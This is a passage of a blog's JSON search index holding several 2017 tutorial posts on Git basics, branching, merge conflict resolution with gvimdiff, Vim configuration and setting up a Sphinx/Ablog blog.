support discussion by using Disqus, monitoring usage by using Google Analytics. See:\nhttp://ablog.readthedocs.io/manual/ablog-configuration-options/?highlight=disqu\nhttp://alabaster.readthedocs.io/en/latest/customization.html#theme-options\nUseful links The following links are quite useful to use Sphinx and customize it:\nCheat sheet of Sphinx:\nhttps://thomas-cokelaer.info/tutorials/sphinx/rest_syntax.html\nConfigure the alabaster theme:\nhttp://alabaster.readthedocs.io/en/latest/customization.html#theme-options\nHow to do cross-reference:\nhttp://ablog.readthedocs.io/manual/cross-referencing-blog-pages/\nPost Excerpts and Images:\nhttp://ablog.readthedocs.io/manual/post-excerpts-and-images/\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/setup-blog_using-sphinx-ablog/","section":"post","tags":["blog","opensource"],"title":"Setup Blog: Using Sphinx and Ablog"},{"body":"","link":"http://localhost:1313/tags/git/","section":"tags","tags":null,"title":"Git"},{"body":"Git: Resolve Conflicts Published: Apr 9, 2017 Tags: git Category: ComputerScience\nGit provides various tools to resolve conflicts during the merge process, and in this blog we only discuss one of them gvimdiff in Windows Operating System.\nTable of Contents Software installation gvimdiff needs Gvim installed, which is GUI Vi text editor and can be downloaded from:\nhttp://www.vim.org/download.php\nAfter the installation, please ensure the executable file path is included in PATH environment variable. You can test it in console by typing gvim to see whether you get the application invoked.\nConfigure gvimdiff In order to use gvimdiff, you need to configure it in git by following command\n1git config merge.tool gvimdiff gvimdiff is using gvim but it is a internal name in git terminology, it means there will be no executable found in your file system. Do not get surprised if your console cannot find gvimdiff.\nUse the following command to setup gvimdiff to have same diff view just like this post:\n1git config merge.conflictstyle diff3 If you are curious about other git merge options, you can check yourself:\n1git mergetool --tool-help Make conflicts Initialize a new repository with a dummy.txt file, put the following content in the file and commit it to master branch:\n1\u0026#34;Hello World\u0026#34; 2no changes 3no changes 4\u0026#34;Hello World again\u0026#34; Create develop branch by using following git command:\n1git branch develop 2git checkout develop Add the following modification in the first line and fourth line. And commit the change into develop branch.\n1\u0026#34;Hello World - develop\u0026#34; 2no changes 3no changes 4\u0026#34;Hello World again - develop\u0026#34; And switch back to master branch, and add following changes.\n1\u0026#34;Hello World - master\u0026#34; 2no changes 3no changes 4\u0026#34;Hello World again 2 - master\u0026#34; As you can see, we have created conflicts between master/develop. The next step will be to resolve them during the merge process.\nResolve conflicts Now, let's switch back to develop and try to merge all the changes from master.\n1git checkout develop 2git merge master Git will complain about conflicts, and you can see following error message in the console:\n1git merge master 2Auto-merging dummy.txt 3CONFLICT (content): Merge conflict in dummy.txt 4Automatic merge failed; fix conflicts and then commit the result. If you look into the current content of dummy.txt, you will find out it has been modified to contain the conflict data.\n1\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD 2\u0026#34;Hello World - develop\u0026#34; 3||||||| merged common ancestors 4\u0026#34;Hello World - develop\u0026#34; 5======= 6\u0026#34;Hello World - master\u0026#34; 7\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; master 8no changes 9no changes 10\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD 11\u0026#34;Hello World again\u0026#34; 12||||||| merged common ancestors 13\u0026#34;Hello World again\u0026#34; 14======= 15\u0026#34;Hello World again 2 - master\u0026#34; 16\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; master On theory, you can resolve the conflicts by 'clean up' the dummy.txt file directly to remove the git conflict syntax. I will not recommend that since it will be inefficient and error prone.\nWe can use gvimdiff utility to resolve the conflict by using following command:\n1git mergetool And you will get the following gvim window\nFor using mergetool in git, we need to understand the following terminology to understand what is being merged:\nLOCAL - the head for the file(s) from the current branch on the machine that you are using. REMOTE - the head for files(s) from a remote location that you are trying to merge into your LOCAL branch. BASE - the common ancestor(s) of LOCAL and BASE. MERGED - the tag / HEAD object after the merge - this is saved as a new commit. The above gvim window show as following style:\n+--------------------------------+ | LOCAL | BASE | REMOTE | +--------------------------------+ | MERGED | +--------------------------------+\ngvimdiff commands As you can see there are four sub-windows in the gvim, in order to switch between the sub-windows, you can use:\n1Ctrl w + h # move to the split on the left 2Ctrl w + j # move to the split below 3Ctrl w + k # move to the split on top 4Ctrl w + l # move to the split on the right 5Ctrl + tab # move to the next window In order to go the previous/next difference, you can use:\n1] + C 2[ + C You can either incorporate the changes by manually editing the MERGED split, or use Vim shortcuts pull from one of the LOCAL, BASE ad REMOTE versions.\n1:diffg RE # get from REMOTE 2:diffg BA # get from BASE 3:diffg LO # get from LOCAL save the changes then quit with :wqa to close all the splits. Remember to commit the merge.\n1git commit -am \u0026#39;merged from several branches\u0026#39; Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/git_resolve-conflicts/","section":"post","tags":["git"],"title":"Git: Resolve Conflicts"},{"body":"","link":"http://localhost:1313/tags/vi/","section":"tags","tags":null,"title":"Vi"},{"body":"Vi: Configuration Example Published: Apr 8, 2017 Tags: vi Category: ComputerScience\nAmong various text editors, I like Vi a lot. It help me a lot if I work on various operating systems and different environment since Vi is installed by default on most operating systems. There is GUI Vi tool available on Windows called Gvim, which can be downloaded from here: http://www.vim.org/download.php\nThe configuration file is named as _vimrc which is located around ProgramFiles(x86)\\Vim. Just open and edit the _vimrc file, but you need to restart Gvim to see the changes.\nThe following settings will be very helpful but not set-on by default.\nIf the GUI is not English, you can add following content in _vimrc 1set langmenu=en_US 2let $LANG = \u0026#39;en_US\u0026#39; 3source $VIMRUNTIME/delmenu.vim 4source $VIMRUNTIME/menu.vim Set to auto read when a file is changed from the outside 1set autoread Ignore case when searching 1set ignorecase Set the dark scheme 1colorscheme desert 2set background=dark Set utf8 as standard encoding 1set encoding=utf8 Turn backup off 1set nobackup 2set nowb 3set noswapfile Set the tab stop 1set tabstop=4 Set the auto indent 1set ai \u0026#34;Auto indent 2set si \u0026#34;Smart indent 3set wrap \u0026#34;Wrap lines Display line numbers on the left 1set number Set the font 1set guifont=courier_new:h12 Maximize the window on startup 1if has(\u0026#34;gui_running\u0026#34;) 2 \u0026#34; GUI is running or is about to start. 3 \u0026#34; Maximize gvim window (for an alternative on Windows, see simalt below). 4 set lines=999 columns=999 5else 6 \u0026#34; This is console Vim. 7 if exists(\u0026#34;+lines\u0026#34;) 8 set lines=50 9 endif 10 if exists(\u0026#34;+columns\u0026#34;) 11 set columns=100 12 endif 13endif Set the spell check on 1set spell Easy approach is to get the example _vimrc file from: https://github.com/wubw/DevScripts/blob/master/_vimrc\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/vi_configuration-example/","section":"post","tags":["vi"],"title":"Vi: Configuration Example"},{"body":"Git: Branch Continue Published: Jan 30, 2017 Tags: git Category: ComputerScience\nThis blog will cover the Git commands which to transfer the changes between branches. If you are not familiar with the basic Git branch commands, you can have a look of my previous blog: git_branch-basic\nTable of Contents Merge Branch When you have two or more branches, you need to integrate some changes from one branch to another.\n1git merge f1 Git merge command will try to integrate all the changes from branch f1 into the current branch (HEAD points to). After run this command, you can check the status by git status and use git add/commit to check-in the changes.\nIf f1 and current branch have changes on same files, conflict will happen in the git merge command. Git will present the conflicts directly in the files, see following example:\n1\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD 2 3current change 4 5======= 6 7greeting from f1 8 9\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; f1 You can use text editor tool to resolve the conflict manually or you can use git mergetool to resolve the conflict.\nRebase Branch In most cases, git branch is created based on an existing branch by using git branch command. Then the newly created branch has relationship with the existing branch. If we want to change the relationship, e.g. let the current branch base on another branch, then you need to use the rebase command.\n1git rebase f2 This command will rebase your current branch on branch f2.\nCherry Pick Sometimes, if you only want to integrate one specific commit from one branch into current branch, then you can use cherry pick command.\n1git cherry-pick 0ac3396 The above command will integrate the specific commit: 0ac3396 into the current branch.\nIf you call merge/rebase command after cherry pick, git will understand the changes and will not re-apply the unnecessary changes.\nSummary Merge/Rebase/Cherry Pick are three basic commands to transfer changes from one branch to another.\nIn order to use git branch in a correct way, you need to understand the good practice of using git flow. There is a good blog explains the git flow .\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/git_branch-continued/","section":"post","tags":["git"],"title":"Git: Branch Continue"},{"body":"Git: Branch Basic Published: Jan 18, 2017 Tags: git Category: ComputerScience\nOne of the biggest advantage of Git is branching. Git is very strong at handling branches, no matter on functionality or on efficiency. Let's try out the Git branch commands.\nTable of Contents Create Branch 1git branch f1 The command will create a new branch called f1. Compared to 'classical' version control system, git will not create a separate folder for new branch. All the branches 'share' the same folder on your file system.\n1git checkout f1 git checkout command will switch from current branch to f1 branch. f1 becomes your current branch, your followings changes will happen on f1. HEAD is the 'pointer' which point to the current commit, which also indicates what is the current branch.\nWhen you switch a branch, the data in repository does not change. It is the HEAD switch to the different commit. And also copy the files from repository to index, working area.\nIf you are confused about the term: commit, index, and working area, please check my previous blogs:\ngit_getting-started\ngit_areas\n1git checkout -b f2 The above command will quickly create a new branch f2 and switch to this new branch.\nVisualisation of History In order to have a clear picture of the current repository, the branching situation, and what is the current branch status, you can simply use the following command:\n1git log --oneline --all --decorate --graph You will see console output like following:\n1\t* 660caea (HEAD -\u0026gt; feature2) f2 2 3\t| * 90e5174 (feature4, feature3) feature 3 changes 4 5\t|/ 6 7\t| * cf54ec8 (feature1) modification from feature1 8 9\t| | * a51f214 (master) Merge branch \u0026#39;feature2\u0026#39; 10 11\t| | |\\ 12 13\t| |/ / 14 15\t| | / 16 17\t| |/ 18 19\t|/| 20 21\t* | bb32dd5 commit feature2 22 23\t| * 0ac3396 commit feature1 24 25\t| * 3fb48f2 feature1 first commit 26 27\t|/ 28 29\t* d3033b2 Add more file and change main.txt 30 31\t* 6b07c39 First commit The numbers are the short version hash for commits. For simplicity, you can regard these numbers as commit id now. From the output, you can see how many branches are in current repository and their relationship. The commit HEAD point to means the current branch.\nThe above command is cumbersome to type, you can use git alias in stead.\n1git config --global alias.loadg \u0026#34;log --oneline --all --decorate --graph\u0026#34; It will create an alias 'loadg' for the long parameters. Then you can simply type to get the history graph:\n1git loadg The alias data will be added into ~/.gitconfig in following format. You can also add the alias manually in this file.\n1[alias] 2 3loadg = log --oneline --all --decorate --graph With this command, you can see the graph and understand repository branching situation easily.\nOther Basic Commands Branch can also be created from the hash number.\n1git branch f3 66ocaea This command will create a new branch f3 based on the commit which has hash number 66ocaea.\n1git branch -m f3 f4 The command will rename branch f3 to f4.\n1git branch -d f4 The command will delete the branch f4.\n1git diff f2 f3 This command shows the difference between two branches.\nSummary This blog only covers the basic branch commands, e.g. create a new branch, modify the branch, view the branch status. Still not touch the real power of git branch.\nIn next blog, I will show how to do the merge, rebase and other advance branch commands.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/git_branch-basic/","section":"post","tags":["git"],"title":"Git: Branch Basic"},{"body":"Git: Areas Published: Jan 14, 2017 Tags: git Category: ComputerScience\nGit has four areas:\nWorking area Index Repository Stash To understand these four areas is essential to learn the git workflow. The following paragraphs will go through these four areas and explain the git workflow. If you are new to git and not familiar with the basic git commands, it is recommended to read my blog post git_getting-started first.\nTable of Contents Working area Working area is where you start adding/modifying/deleting files. Working area is equal to what you see on your file system.\nIf git status returns nothing, it means working area, index, repository are equal.\ngit diff command can show the difference between working area and index.\ngit checkout -- can discard the changes on working area.\nIndex Index is a staging area for git, which stays in the middle of working area and repository.\ngit add command can copy the changes from working area to index.\ngit reset HEAD command can discard the changes in index.\ngit diff --cached command can show the difference between index and repository.\ngit rm --cached command can remove a file from index.\ngit mv command can rename a file name in index and working area\nRepository Repository is the place to store all the commits, no matter it is a local one or a central one.\nBasically, all the commits are immutable.\ngit commit is the command to copy changes from index to repository.\nStash Stash is a place to store temporary changes from working areas and index, which is like a clipboard of your project.\nUse git stash when you want to record the current state of the working directory and the index, but want to go back to a clean working directory. The command saves your local modifications away and reverts the working directory to match the HEAD commit.\ngit stash list shows all the stashed changes.\ngit stash show can view the details of stashed change.\ngit stash apply can retrieve the stashed change.\ngit stash clear clean-up the stash area.\nSummary In order to use git efficiently, it is necessary to understand the areas your files reside now, and the workflow of the git files.\nIt is not easy to remember all the commands and arguments. Just remember the basic and visit git doc when necessary will help.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/git_areas/","section":"post","tags":["git"],"title":"Git: Areas"},{"body":"Git: Getting Started Published: Jan 11, 2017 Tags: git Category: ComputerScience\nGit is an open source distributed version control system, which plays important role in current software ecosystem. You may find many GUI Git tools like SourceTree, Github Desktop, TortoiseGit etc, however the best way to learn Git is to deep dive into the Git commands and understand the fundamental. Let's start the 'Git journey' by using the basic commands.\nTable of Contents Install Git First, go to Git download page: https://git-scm.com/downloads\nDownload and install the git on your operating system.\nInitialize Repository In order to use Git, you need to initialize a local repository first.\n1mkdir FirstRepo 2cd FirstRepo 3git init The folder and file operation commands will be slightly different depends on your operating system.\nA hidden .git folder should be created by the above command. You can use ls -a to verify it.\nCheck Status git status is a handy command to check the current repository status. It is recommended it is used from time to time.\nIf you use git status now, the console output will be:\n1On branch master 2Inital commit 3nothing to commit (create/copy files and use \u0026#34;git add\u0026#34; to track) Add Files Let's add some example files and folders in the repository.\n1mkdir SubFolder 2touch main.txt 3touch SubFolder\\sub.txt Use tree command to verify that two files and one folder are created in the repository.\n1. 2 3├── SubFolder 4 5│ └── sub.txt 6 7└── main.txt Type git status again, and the console output should tell you that there are 'untracked files'.\nCommit to Local Repository Go to the repository root folder, and run git add .\nType git status and you can see from console output that there are changes to be committed and no untracked files. (If you run the above command in sub folder, then only the files under subfolders will be tracked)\nRun git commit command to commit the change to local repository, and you will encounter a vi look-like program to ask you provide the description for the up-comming commit. Type i and go into text edit mode; write down the description for the commit, like 'First commit'; then press Esc and :wq to save and quit that vi look like program.\nIf everything goes well, you will see that files are commit and git status will tell that nothing to commit, and working directory clean.\nCommit to Remote Repository In order to collaborate with other developers, you need to publish the repository to a remote repository or a center repository like GitHub.\nNow go to GitHub do the registration, create a repository on GitHub, and get the git URL of the repository.\nThe URL looks like: https://github.com/{username}/{repositoryname}.git\nUse the following command to 'push' your local repository to the Github:\n1git push --set-upstream https://github.com/{username}/{repositoryname}.git master You will be asked to enter your Github user name and credential. After the 'push' command succeeds, you can see the files appear on the Github repository.\nCongratulations! You manage to use the basic git commands.\nSummary Git commands are the best way to learn git, but it is not straight forward to understand and remember. Practice will help.\nThere will be following blogs explain further how to use git well and the git fundamental.\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/git_getting-started/","section":"post","tags":["git"],"title":"Git: Getting Started"}]